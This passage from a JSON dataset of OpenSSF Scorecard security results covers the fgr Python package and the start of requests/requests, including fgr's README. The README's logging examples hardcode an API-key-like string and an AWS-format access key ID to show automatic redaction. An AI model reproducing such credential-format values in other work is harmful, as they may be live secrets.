                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:71: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:74: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:98: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:102: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:128: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/main.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/main.yml:135: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/main.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/main.yml:143: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/main.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/main.yml:149: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:47: update your workflow using https://app.stepsecurity.io/secureworkflow/dan1hc/fgr/main.yml/main?enable=pin",
                        "Warn: npmCommand not pinned by hash: .github/workflows/main.yml:50",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:82",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:107",
                        "Info:   0 out of  10 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   3 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   2 pipCommand dependencies pinned",
                        "Info:   0 out of   1 npmCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 7 commits out of 11 are checked with a SAST tool"
                    ],
                    "score": 8,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v0.4.5 not signed: https://api.github.com/repos/dan1hc/fgr/releases/148063894",
                        "Warn: release artifact v0.4.5-rc.1 not signed: https://api.github.com/repos/dan1hc/fgr/releases/148063276",
                        "Warn: release artifact v0.4.4 not signed: https://api.github.com/repos/dan1hc/fgr/releases/146936579",
                        "Warn: release artifact v0.4.3 not signed: https://api.github.com/repos/dan1hc/fgr/releases/146936256",
                        "Warn: release artifact v0.4.2 not signed: https://api.github.com/repos/dan1hc/fgr/releases/146863664",
                        "Warn: release artifact v0.4.5 does not have provenance: https://api.github.com/repos/dan1hc/fgr/releases/148063894",
                        "Warn: release artifact v0.4.5-rc.1 does not have provenance: https://api.github.com/repos/dan1hc/fgr/releases/148063276",
                        "Warn: release artifact v0.4.4 does not have provenance: https://api.github.com/repos/dan1hc/fgr/releases/146936579",
                        "Warn: release artifact v0.4.3 does not have provenance: https://api.github.com/repos/dan1hc/fgr/releases/146936256",
                        "Warn: release artifact v0.4.2 does not have provenance: https://api.github.com/repos/dan1hc/fgr/releases/146863664"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: jobLevel 'actions' permission set to 'write': .github/workflows/main.yml:122",
                        "Warn: jobLevel 'contents' permission set to 'write': .github/workflows/main.yml:123",
                        "Warn: jobLevel 'deployments' permission set to 'write': .github/workflows/main.yml:124",
                        "Warn: no topLevel permission defined: .github/workflows/codeql.yml:1"
                    ],
                    "score": 9,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/dan1hc/fgr/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\nUse this section to tell people about which versions of your project are\ncurrently being supported with security updates.\n\n| Version | Supported          |\n| ------- | ------------------ |\n| 0.x     | :white_check_mark: |\n\n## Reporting a Vulnerability\n\nPlease use [this link](https://github.com/dan1hc/fgr/security/advisories/new) to report a vulnerability.\n\nProject maintenance will analyze the situation and respond with 24-48 hours, depending on severity.\n\nIf vulnerability is confirmed, it will be patched in a time period commensurate with severity.\n",
        "project_all_labels": [
            "bug",
            "documentation",
            "duplicate",
            "enhancement",
            "good first issue",
            "help wanted",
            "invalid",
            "question",
            "wontfix"
        ],
        "README_content": "# [![banner](https://1howardcapital.s3.amazonaws.com/images/fgr/banner.png)](https://fgr.readthedocs.io)\n\n[![MinVersion](https://img.shields.io/python/required-version-toml?tomlFilePath=https://raw.githubusercontent.com/dan1hc/fgr/main/pyproject.toml&color=gold)](https://pypi.org/project/fgr)\n[![PyVersions](https://img.shields.io/pypi/pyversions/fgr?color=brightgreen)](https://pypi.org/project/fgr)\n[![OpenSSF](https://www.bestpractices.dev/projects/8565/badge)](https://www.bestpractices.dev/projects/8565)\n[![readthedocs](https://readthedocs.org/projects/fgr/badge)](https://fgr.readthedocs.io)\n[![CI](https://github.com/dan1hc/fgr/actions/workflows/main.yml/badge.svg?branch=main&event=push)](https://github.com/dan1hc/fgr/actions)\n[![codeql](https://github.com/dan1hc/fgr/workflows/codeql/badge.svg)](https://github.com/dan1hc/fgr/actions/workflows/codeql.yml)\n[![coverage](https://img.shields.io/badge/dynamic/toml?url=https://raw.githubusercontent.com/dan1hc/fgr/main/pyproject.toml&query=tool.coverage.report.fail_under&label=coverage&suffix=%25&color=brightgreen)](https://github.com/dan1hc/fgr/actions)\n[![pre-commit](https://img.shields.io/badge/pre--commit-enabled-brightgreen?logo=pre-commit&logoColor=white)](https://github.com/pre-commit/pre-commit)\n[![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)\n[![mypy](https://www.mypy-lang.org/static/mypy_badge.svg)](http://mypy-lang.org/)\n[![PyPI](https://img.shields.io/pypi/v/fgr?color=blue)](https://pypi.org/project/fgr)\n[![License](https://img.shields.io/pypi/l/fgr?color=blue)](https://www.gnu.org/licenses/lgpl-3.0)\n\n# Overview\n\n**Author:** dan@1howardcapital.com | daniel.dube@annalect.com\n\n**Pronunciation:** _ˈfiɡər `>` ˈfiɡyər `==` \"figure\"_\n\n**Summary:** Zero-dependency python framework for object oriented development.\nImplement _once_, document _once_, in _one_ place.\n\n> With fgr, you will quickly learn established best practice...\n> or face the consequences of runtime errors that will break your code\n> if you deviate from it.\n>\n> Experienced python engineers will find a framework\n> that expects and rewards intuitive magic method usage,\n> consistent type annotations, and robust docstrings.\n>\n> Implement _pythonically_ with fgr and you will only ever need to:\n> implement _once_, document _once_, in _one_ place.\n\n---\n\n## Mission Statement\n\nUltimately, fgr seeks to capture and abstract all recurring patterns in\napplication development with known, optimal implementations, so engineers\ncan focus more on clever implementation of application-specific logic and good\ndocumentation than on things like how to query X database most efficiently,\nwhether or not everything important is being logged correctly, where to\nput what documentation, and how to implement an effective change management\nscheme with git in the first place.\n\n## Getting Started\n\n### Installation\n\n```bash\npip install fgr\n```\n\n### Basic Usage\n\n```py\nimport fgr\n\n\nclass Pet(fgr.Object):\n    \"\"\"A pet.\"\"\"\n\n    id_: fgr.Field[int]\n    name: fgr.Field[str]\n    type_: fgr.Field[str] = {\n        'default': 'dog',\n        'enum': ['cat', 'dog'],\n        'nullable': False,\n        'required': True,\n        }\n    is_tail_wagging: fgr.Field[bool] = fgr.Field(\n        default=True,\n        enum=[True, False],\n        nullable=False,\n        required=True,\n        )\n\n```\n\n## Best Practice - Guard Rails at a Bowling Alley\n\nfgr has been designed from the outset to teach best practice to less\nexperienced python engineers, without compromising their ability to\nmake effective and timely contributions.\n\n> To fgr, it is more important developers are able to make\n> effective contributions while learning, rather than sacrifice\n> any contribution at all until the developer fully understands\n> why something that could be done many ways should only ever\n> be done one way.\n\n#### Exceptions\n\nThis is achieved primarily through the raising of exceptions.\nIn many cases, if a developer inadvertently deviaties from a known\nbest practice, fgr will raise a code-breaking error (informing\nthe developer of the violation) until the developer implements\nthe optimal solution.\n\n#### Logging\n\nfgr will commandeer your application's log.\n\n* It will automatically redact sensitive data inadvertently introduced\nto your log stream that would have made your application fail audits.\n* It will intercept, warn once, and subsequently silence print statements,\ndebug statements, and other errant attempts at logging information in ways\ncertain to introduce a known anti-pattern, vulnerability, or otherwise\npollute your log stream.\n\n> In short, if fgr raises an error or otherwise does not support\n> the thing you are trying to do: it is because the way in which you\n> are trying to do it contains at least one anti-pattern to a known,\n> optimal solution.\n\n## Advanced Usage\n\n```py\nimport fgr\n\n\nclass Flea(fgr.Object):\n    \"\"\"A nuisance.\"\"\"\n\n    name: fgr.Field[str] = 'FLEA'\n\n\nclass Pet(fgr.Object):\n    \"\"\"A pet.\"\"\"\n\n    id_: fgr.Field[str]\n    _alternate_id: fgr.Field[int]\n\n    name: fgr.Field[str]\n    type_: fgr.Field[str] = {\n        'default': 'dog',\n        'enum': ['cat', 'dog'],\n        'nullable': False,\n        'required': True,\n        }\n\n    in_: fgr.Field[str]\n    is_tail_wagging: fgr.Field[bool] = fgr.Field(\n        default=True,\n        enum=[True, False],\n        nullable=False,\n        required=True,\n        )\n\n    fleas: fgr.Field[list[Flea]] = [\n        Flea(name='flea1'),\n        Flea(name='flea2')\n        ]\n\n\n# Automatic case handling.\nrequest_body = {\n    'id': 'abc123',\n    'alternateId': 123,\n    'name': 'Bob',\n    'type': 'dog',\n    'in': 'timeout',\n    'isTailWagging': False\n    }\npet = Pet(request_body)\n\nassert pet.is_snake_case == Pet.is_snake_case is True\nassert pet.isCamelCase == Pet.isCamelCase is False\nassert pet['alternate_id'] == pet._alternate_id == request_body['alternateId']\nassert dict(pet) == {k: v for k, v in pet.items()} == pet.to_dict()\n\n# Automatic, mutation-safe \"default factory\".\ndog = Pet(id='abc321', alternate_id=321, name='Fido')\nassert pet.fleas[0] is not dog.fleas[0]\n\n# Automatic memory optimization.\nassert Flea().__sizeof__() == (len(Flea.__slots__) * 8) + 16 == 24\n\nclass Flet(Flea, Pet):\n    ...\n\nclass Pea(Pet, Flea):\n    ...\n\nassert Flet().__sizeof__() == (len(Flet.__base__.__slots__) * 8) + 16 == 72\nassert Pea().__sizeof__() == (len(Pea.__base__.__slots__) * 8) + 16 == 72\nassert Flet().name == 'FLEA' != Pea().name\n\n# Intuitive, database agnostic query generation.\nassert isinstance(Pet.is_tail_wagging, fgr.Field)\nassert isinstance(Pet.type_, fgr.Field)\n\nassert dog.type_ == Pet.type_.default == 'dog'\n\nquery = (\n    (\n        (Pet.type_ == 'dog')\n        & (Pet.name == 'Fido')\n        )\n    | Pet.name % ('fido', 0.75)\n    )\nquery += 'name'\nassert dict(query) == {\n    'limit': None,\n    'or': [\n        {\n            'and': [\n                {\n                    'eq': 'dog',\n                    'field': 'type',\n                    'limit': None,\n                    'sorting': []\n                    },\n                {\n                    'eq': 'Fido',\n                    'field': 'name',\n                    'limit': None,\n                    'sorting': []\n                    }\n                ],\n            'limit': None,\n            'sorting': []\n            },\n        {\n            'field': 'name',\n            'like': 'fido',\n            'limit': None,\n            'sorting': [],\n            'threshold': 0.75\n            }\n        ],\n    'sorting': [\n        {\n            'direction': 'asc',\n            'field': 'name'\n            }\n        ]\n    }\n\n```\n\n### Local Logging\n```py\nimport fgr\n\n\nclass AgentFlea(fgr.Object):\n    \"\"\"Still a nuisance.\"\"\"\n\n    name: fgr.Field[str] = 'FLEA'\n    apiKey: fgr.Field[str] = '9ac868264f004600bdff50b7f5b3e8ad'\n    awsAccessKeyId: fgr.Field[str] = 'falsePositive'\n    sneaky: fgr.Field[str] = 'AKIARJFBAG3EGHFG2FPN'\n\n\n# Automatic log configuration, cleansing, and redaction.\n\nprint(AgentFlea())\n# >>>\n# {\n#   \"level\": WARNING,\n#   \"time\": 2024-02-26 18:50:20.317 UTC,\n#   \"log\": fgr.core.log,\n#   \"data\":   {\n#     \"message\": \"Calls to print() will be silenced by fgr.\"\n#   }\n# }\n# {\n#   \"apiKey\": \"[ REDACTED :: API KEY ]\",\n#   \"awsAccessKeyId\": \"falsePositive\",\n#   \"name\": \"FLEA\",\n#   \"sneaky\": \"[ REDACTED :: AWS ACCESS KEY ID ]\"\n# }\n\nprint(AgentFlea())\n# >>>\n# {\n#   \"apiKey\": \"[ REDACTED :: API KEY ]\",\n#   \"awsAccessKeyId\": \"falsePositive\",\n#   \"name\": \"FLEA\",\n#   \"sneaky\": \"[ REDACTED :: AWS ACCESS KEY ID ]\"\n# }\n\n```\n\n### Deployed Logging\n\n```py\nimport os\nos.environ['ENV'] = 'DEV'\n\nimport fgr\n\nassert (\n    fgr.core.constants.PackageConstants.ENV\n    in {\n        'dev', 'develop',\n        'qa', 'test', 'testing',\n        'uat', 'stg', 'stage', 'staging',\n        'prod', 'production',\n        }\n    )\n\n\nclass AgentFlea(fgr.Object):\n    \"\"\"Still a nuisance.\"\"\"\n\n    name: fgr.Field[str] = 'FLEA'\n    apiKey: fgr.Field[str] = '9ac868264f004600bdff50b7f5b3e8ad'\n    awsAccessKeyId: fgr.Field[str] = 'falsePositive'\n    sneaky: fgr.Field[str] = 'AKIARJFBAG3EGHFG2FPN'\n\n\nprint(AgentFlea())\n# >>>\n# {\n#   \"level\": WARNING,\n#   \"time\": 2024-02-26 19:02:29.020 UTC,\n#   \"log\": fgr.core.log,\n#   \"data\":   {\n#     \"message\": \"Call to print() silenced by fgr.\",\n#     \"printed\": \"{\\n  \\\"apiKey\\\": \\\"[ REDACTED :: API KEY ]\\\",\\n  \\\"awsAccessKeyId\\\": \\\"falsePositive\\\",\\n  \\\"name\\\": \\\"FLEA\\\",\\n  \\\"sneaky\\\": \\\"[ REDACTED :: AWS ACCESS KEY ID ]\\\"\\n}\"\n#   }\n# }\n\nprint(AgentFlea())\n# >>>\n\nfgr.log.info(AgentFlea())\n# >>>\n# {\n#   \"level\": INFO,\n#   \"time\": 2024-02-26 19:13:21.726 UTC,\n#   \"log\": fgr.core.log,\n#   \"data\":   {\n#     \"AgentFlea\": {\n#       \"apiKey\": \"[ REDACTED :: API KEY ]\",\n#       \"awsAccessKeyId\": \"falsePositive\",\n#       \"name\": \"FLEA\",\n#       \"sneaky\": \"[ REDACTED :: AWS ACCESS KEY ID ]\"\n#     }\n#   }\n# }\n\n```\n\n## Planned Features\n\n* #### ~~Wiki / Sphinx Documentation Support~~ Done!\n    * fgr should support a simple interface for generating wiki / sphinx\n    style documentation for packages.\n* #### RESTful Framework / OpenAPI Support\n    * fgr should support all aspects of an OpenAPI specification and\n    provide corresponding framework functionality for HTTP request\n    handling.\n* #### Template Packages\n    * fgr should include a Pet shop style demo API and python package\n    as a template for developers to copy / paste from.\n* #### Database Parse & Sync\n    * fgr should be able to generate a python package with fully enumerated\n    and optimized `Objects` (and a corresponding fgr API package) when\n    supplied with access to a database for which at least one schema may be\n    inferred.\n        * CLI commands like `$ fgr-api-from-sql ${api_name} ${sql_conn_string} .`\n        should instantly output two ideally structured package repositories for a\n        RESTful python API and corresponding object management package.\n        * The package could use any supplied credentials to either query a database\n        directly or make requests to a deployed API. This means the same package\n        used to power the API can be distributed and pip installed across an\n        organization so business intelligence, data science, and other technical\n        team members can manipulate data for their needs, while leaning on\n        the package to optimize queries and stay informed around permission\n        boundaries and request limits.\n* #### Repo Generation\n    * fgr should be expanded to optionally wrap any generated packages\n    in a repository pre-configured with essentials and CI that should:\n        * implement an ideal [trunk-based branch strategy](https://trunkbaseddevelopment.com/),\n        inline with current best practices for change management and\n        developer collaboration\n        * enforce python code style best practices through automated\n        [linting and formatting](https://docs.astral.sh/ruff)\n        * type-check python code and generate a report with [mypy](https://mypy.readthedocs.io/en/stable/index.html)\n        * run tests automatically, generate reports, and prevent commits that break tests\n        * automatically prevent commits that do not adhere to standardized commit\n        message [conventions](https://www.conventionalcommits.org/en/v1.0.0/)\n        * using those conventions, automatically [semantically version](https://python-semantic-release.readthedocs.io/en/stable/#getting-started)\n        each successful PR and automatically generate and update a\n        CHANGELOG.md file\n        * automatically generate and publish secure wiki documentation\n    * Generated repos may contain up to all of the following:\n        * CHANGELOG.md\n        * CODEOWNERS\n        * CONTRIBUTING.md\n        * .git\n            * .git/hooks/\n        * .github/workflows/\n            * Support planned for gitlab and bamboo.\n        * .gitignore\n        * LICENSE\n        * [.pre-commit-config.yaml](https://pre-commit.com/#intro)\n        * pyproject.toml\n        * README.md\n        * /src\n            * /package\n            * /tests\n* #### Async\n    * Everything should be runnable as coroutines.\n\n## Credits\n\n* #### @sol.courtney\n    * Teaching me the difference between chicken-scratch, duct tape, and bubble\n    gum versus actual engineering, and why it matters.\n* #### pydantic\n    * A portion of whose code for dealing with aggravating things like\n    handling ForwardRefs I shamelessly copy, pasted, and re-purposed.\n* #### python-semantic-release\n    * Much of whose CI I shamelessly copy, pasted, and re-purposed.\n",
        "num_commits": 53,
        "project_age_days": 243,
        "project_created_at": "2024-02-29",
        "latest_updated_at": "2024-07-28",
        "latest_pushed_at": "2024-07-29",
        "num_contributors": 2,
        "num_pull": 15,
        "num_issues": 41,
        "num_opening_issue": 2,
        "project_size(kB)": 412,
        "num_stargazers": 0,
        "num_watchers": 0,
        "num_forks": 0,
        "num_subscribers": 1,
        "SecurityPolicy_created_at": "2024-03-02 01:00:43",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "0db6e1493b676f56cb01da3f742e6cbb2c6ea2ba",
                "url": "https://github.com/dan1hc/fgr/commit/0db6e1493b676f56cb01da3f742e6cbb2c6ea2ba",
                "date": "2024-03-03 22:38:44"
            },
            {
                "commit_id": "ceb52ccfd9fe3c7d8016b0172421640c1109a1b8",
                "url": "https://github.com/dan1hc/fgr/commit/ceb52ccfd9fe3c7d8016b0172421640c1109a1b8",
                "date": "2024-03-02 01:00:43"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "advisory",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "requests/requests",
        "project_url": "https://github.com/requests/requests",
        "SSF": {
            "date": "2024-10-29T19:00:24+07:00",
            "repo": {
                "name": "github.com/requests/requests",
                "commit": "ed0b1b58023276adc66615f3af9bee22d0d16e1b"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 8.6,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: no status checks found to merge onto branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'main'"
                    ],
                    "score": 6,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "12 out of 12 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: fatiando contributor org/company found, statsd contributor org/company found, simplenote-vim contributor org/company found, chardet contributor org/company found, marsauto contributor org/company found, jovyan contributor org/company found, databricks contributor org/company found, rpc4django contributor org/company found, whyaretheflagsup contributor org/company found, hapy contributor org/company found, amazon web services contributor org/company found, pypy contributor org/company found, jupyter-widgets contributor org/company found, endoflife-date contributor org/company found, github3py contributor org/company found, django contributor org/company found, zopefoundation contributor org/company found, jupyter-attic contributor org/company found, jupytercon contributor org/company found, NaPoGenMo contributor org/company found, util-linux contributor org/company found, schibsted contributor org/company found, railsadminteam contributor org/company found, https://burke.services contributor org/company found, zodb contributor org/company found, requests contributor org/company found, PyCQA contributor org/company found, didcot-data contributor org/company found, plone contributor org/company found, jupyter contributor org/company found, python contributor org/company found, secure-email contributor org/company found, pyca contributor org/company found, sv24-archive contributor org/company found, bqplot contributor org/company found, WahKazoo contributor org/company found, ergochat contributor org/company found, sagemath contributor org/company found, python-ldap contributor org/company found, pytest-dev contributor org/company found, NaNoGenMo contributor org/company found, nordsoftware contributor org/company found, oragono contributor org/company found, pyparsing contributor org/company found, pylast contributor org/company found, mobbler contributor org/company found, python-humanize contributor org/company found, freifunk-ffm contributor org/company found, pioneer valley books contributor org/company found, python-trio contributor org/company found, pypa contributor org/company found, pyflakes contributor org/company found, urllib3 contributor org/company found, github contributor org/company found, Pioneer-Valley-Books contributor org/company found, sqlalchemy-redshift contributor org/company found, certifi contributor org/company found, apple contributor org/company found, web-platform-tests contributor org/company found, ultrajson contributor org/company found, flake8-implicit-str-concat contributor org/company found, deadsetbit contributor org/company found, ipython contributor org/company found, WICG contributor org/company found, django-mptt contributor org/company found, FactoryBoy contributor org/company found, afncloud contributor org/company found, helsinki-python contributor org/company found, python-hyper contributor org/company found, aws contributor org/company found, umbrellaco contributor org/company found, django-auth-ldap contributor org/company found, python-distro contributor org/company found, encode contributor org/company found, intranett contributor org/company found, python-attrs contributor org/company found, salesforce contributor org/company found, voila-dashboards contributor org/company found, read the docs contributor org/company found, openhab contributor org/company found, phan contributor org/company found, twisted contributor org/company found, Jarn contributor org/company found, Flexget contributor org/company found, dask contributor org/company found, collective contributor org/company found, python-pillow contributor org/company found, unitedstates contributor org/company found, psf contributor org/company found, newlogic contributor org/company found, jazzband contributor org/company found, canvg contributor org/company found, phosphorjs contributor org/company found, sandiegopython contributor org/company found, cycle148hki contributor org/company found, citybikes contributor org/company found, kennethreitz-archive contributor org/company found, PyconUK contributor org/company found, termcolor contributor org/company found, python-twitter-tools contributor org/company found, asnible contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 101 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Info: OSSFuzz integration found"
                    ],
                    "score": 10,
                    "reason": "project is fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "17 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: pipCommand not pinned by hash: .github/workflows/run-tests.yml:77",
                        "Info:  12 out of  12 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   2 out of   2 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   1 pipCommand dependencies pinned"
                    ],
                    "score": 8,
                    "reason": "dependency not pinned by hash detected -- score normalized to 8",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Info: all commits (30) are checked with a SAST tool"
                    ],
                    "score": 10,
                    "reason": "SAST tool is run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: .github/SECURITY.md:1",
                        "Info: Found linked content: .github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: .github/SECURITY.md:1",
                        "Info: Found text in security policy: .github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
